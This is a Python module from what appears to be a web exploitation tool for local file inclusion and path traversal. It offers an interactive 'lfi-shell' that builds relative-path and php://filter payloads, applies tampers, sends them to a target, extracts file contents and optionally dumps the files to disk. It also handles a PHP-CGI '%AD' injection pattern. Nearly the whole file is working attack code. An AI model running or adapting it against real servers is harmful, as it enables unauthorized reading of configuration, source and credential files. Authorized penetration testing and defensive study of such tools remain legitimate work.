from lib.utils.my_functions import MsgEvent,AskQuestion,ANSIcolors,FormattedSize,HTTP_code_status
from lib.attacks.testing_web import tamper_pipe_line,combine_current_injection,update_request_payload
from lib.http.request_packet import test_connectivity


def show_finding_payloads(answer):
    print(
        '---\n'
        f"Parameter: {answer['technique'][0]['Parameter_Name']} ({answer['technique'][0]['HTTP_method']})"
    )
    path_depth=0
    for i in range(len(answer['technique'])):
        if answer['technique'][i]['Type']=='relative path':
            path_depth=answer['technique'][i]['move']
        print(
            f"    Type: {answer['technique'][i]['Type']} " + 
            (f"- {path_depth} Traversal depth\n" if path_depth != 0 else "\n") + 
            f"    Payload: {answer['technique'][i]['Payload']}"
        )
        if len(answer['technique'])-1 != i:
            print()
    print('---')
    print(f"web server operating system: {answer['os_banner']}")
    print(f"web application technology: {answer['app_banner']}")

    return



def find_exploit_points(target,poc):
    import re
    import os
    from copy import deepcopy
    from urllib.parse import quote

    res='1'
    items_number={
        'absolute path':1,
        'relative path':2,
        'php://filter wrapper':3
    }
    for i in range(len(poc['technique'])):
        for j in range(len(poc['technique'])):
            if items_number[poc['technique'][i]['Type']]<items_number[poc['technique'][j]['Type']]:
                poc['technique'][i],poc['technique'][j]=poc['technique'][j],poc['technique'][i]


    if len(poc['technique'])>1:
        question=f"Which path traversal technique should be used?\n[1] {poc['technique'][0]['Type']} (default)\n"

        for i in range(1,len(poc['technique'])):
            question+=f"[{i+1}] {poc['technique'][i]['Type']}\n"
        question+="> "
        _choices=list(map(str, range(1, len(poc['technique'])+1)))
        default='1'
        res=AskQuestion(question,_choices,default,target)

    MainExploitTechnique=poc['technique'][int(res)-1]

    if MainExploitTechnique["HTTP_method"]=='POST':
        parts = target.parameters.post.post_query.split("*")
    if MainExploitTechnique["HTTP_method"]=='GET':
        parts = target.parameters.url.url.split("*")

    match=''
    mark=''
    # relative path
    if MainExploitTechnique['Type'] == 'relative path':
        match = re.match(r'^(?:\.\./)+', MainExploitTechnique['Payload'])[0]

    # php://filter wrapper
    if MainExploitTechnique['Type'] == 'php://filter wrapper':
        question = f"Whether to use the default Base64 encoding filter? [Y/n] "
        _choices = ['Y','n']
        default  = 'Y'
        res=AskQuestion(question,_choices,default,target)
        if res != 'Y':
            match = MainExploitTechnique['Payload'].split('convert.base64-encode/resource=')[0]
            match = match + input(f"{ANSIcolors.BOLD}Enter a filter (e.g., 'convert.base64-encode'): {ANSIcolors.RESET}") + '/resource='
        else:
            match='php://filter/convert.base64-encode/resource='
        match=quote(match)

    print(MsgEvent(target.debug_level(),'INFO',"To quit type 'x' or 'q' and press ENTER"),end='')

    for currnet_injec_index in range(len(parts)-1):

        if int(poc['technique'][0]['Parameter_Name'][1:2]) != (currnet_injec_index+1):
            continue

        while True:
            tmp_target=deepcopy(target)
            mark = input('lfi-shell> ')

            if mark in ['x','q']:
                return

            mark=quote(mark)

            # relative path
            if MainExploitTechnique['Type'] == 'relative path':
                if mark.startswith('/'):
                    mark=mark[1:]
                mark = f"{match}{mark}"

            # php://filter wrapper
            if MainExploitTechnique['Type'] == 'php://filter wrapper':
                mark = f"{match}{mark}"

            if 'php-cgi/php-cgi.exe?%AD' in target.parameters.url.url:
                mark=f"%22{mark}%22"

            mark=tmp_target.args.prefix + mark + tmp_target.args.suffix

            mark=tamper_pipe_line(tmp_target.tampers(),mark)
            test_case=combine_current_injection(mark,currnet_injec_index,parts)
            tmp_target=update_request_payload(tmp_target,MainExploitTechnique["HTTP_method"],test_case)

            print(MsgEvent(target.debug_level(),'PAYLOAD',test_case),end='')

            res_content=test_connectivity(tmp_target)
            if res_content=='':
                print(MsgEvent(target.debug_level(),'WARNING',f"Request failed. Please check if the network is stable or if it was blocked by WAF protection.",BoldFlag=True),end='')
                continue
            
            if res_content=='Q':
                return

            if res_content.status_code!=200:
                print(MsgEvent(target.debug_level(),'DEBUG',f'got the http code : {HTTP_code_status(res_content.status_code)}'),end='')

            match_res=take_contents(res_content.body, pre=tmp_target.args.detect_prefix, suf=tmp_target.args.detect_suffix)
            
            if match_res:
                print(MsgEvent(target.debug_level(),'DEBUG',f"The size of file '{mark}' is {FormattedSize(match_res[0])}."),end='')
                if len(match_res[0])==0:
                    print(MsgEvent(target.debug_level(),'WARNING','Detected file size is 0, the file may not exist or access is denied.'),end='')

                if tmp_target.args.dump:
                    if not os.path.exists(f'.saves/{target.parameters.url.domain}'):
                        os.makedirs(f'.saves/{target.parameters.url.domain}')
                    if not os.path.exists(f'.saves/{target.parameters.url.domain}/dump'):
                        os.makedirs(f'.saves/{target.parameters.url.domain}/dump')
                    
                    with open(f'.saves/{target.parameters.url.domain}/dump/{sanitize_filename(mark)}', "w", encoding="utf-8") as f:
                        f.write(match_res[0])
                    print(f'File {mark} has been downloaded to')
                    print(f'[*] .saves/{target.parameters.url.domain}/dump/{sanitize_filename(mark)}\n')
                else:
                    print(f"[*] '{mark}' output:\n{match_res[0]}\n")

            else:
                print(MsgEvent(target.debug_level(),'WARNING','Defined prefix/suffix not found in the page, no output matched.'),end='')




def sanitize_filename(filename: str) -> str:
    from re import sub
    # 定義各系統非法字元（Windows 常見: \ / : * ? " < > |）
    # POSIX 系統只禁止 /，Windows 會禁止更多
    illegal_chars = r'[\/:*?"<>|]'
    return sub(illegal_chars, "_", filename)


def take_contents(data:str, pre="", suf=""):
    from re import escape,DOTALL,findall
    if pre == "" and suf == "":
        # 兩個都空，就直接整個字串
        return [data]
    elif pre == "":
        # 只有 suf，當開頭到 suf
        pattern = rf"^(.*?){escape(suf)}"
    elif suf == "":
        # 只有 pre，當 pre 到結尾
        pattern = rf"{escape(pre)}(.*?)$"
    else:
        # 一般情況
        pattern = rf"{escape(pre)}(.*?){escape(suf)}"
    return findall(pattern, data, flags=DOTALL)
